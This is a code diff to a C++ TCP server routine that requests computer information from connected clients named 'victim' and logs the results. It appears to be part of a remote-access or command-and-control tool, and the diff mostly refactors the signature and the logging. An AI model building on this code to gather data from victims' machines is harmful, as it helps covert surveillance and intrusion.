@@ -1,10 +1,10 @@
 #include "..\Library\precompile.h"
 #include "..\Library\tcp_server.h"
 
-bool tcp_server::request_info(client& victim, bool request)
+bool tcp_server::info(client& victim, action fetch)
 {
 	// Requesting 
-	if (request) {
+	if (!fetch) {
 
 		//Since this info does not update too often this makes sure that it will only update if the values are empty
 
@@ -13,13 +13,15 @@ bool tcp_server::request_info(client& victim, bool request)
 			return false;
 		}
 
-		console << "[~] Requesting information from " << victim.name << "\n";
+		console << "[~] Request from " << victim.name << "\n";
 
 		// Make a request for every query
 
 		for (auto keyval : victim.computer_info) {
-			console << "Send Request(" << keyval.first << ") -> " << format_error(tcp_server::send(victim, keyval.first, "Info Request")).code << "\n";
+			tcp_server::send(victim, keyval.first, "Info Request");
 		}
+
+		console << "[~] Request sent to " << victim.name << "\n";
 
 		return true;
 	}
@@ -60,10 +62,15 @@ bool tcp_server::request_info(client& victim, bool request)
 				}
 
 				if (std::all_of(victim.computer_info.begin(), victim.computer_info.end(), [&](std::pair<std::string, std::string> const& i) {return !i.second.empty(); })) {
+					
+					console << "[+] Received information successfully\n";
+
 					return true;
 				}
 			}
 		}
+
+		console << "[-] Failed to receive information, client disconnected\n";
 
 		return false;
 
